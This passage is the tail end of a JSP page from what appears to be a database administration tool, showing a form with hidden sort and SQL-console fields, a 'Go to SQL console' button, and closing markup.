		<input type="hidden" name="sort" value="<%=sortMode%>">
		<input type="hidden" name="sqlConsole" value="">
		<input title="Go to SQL console" type="Submit" class="button" id="but_Con" name="Submit" value="<%=SQL_LABEL%>">
	</form>
	<% }%>
    </div>
	<hr>
    <%}%>
</body>
</html><%
    }
%>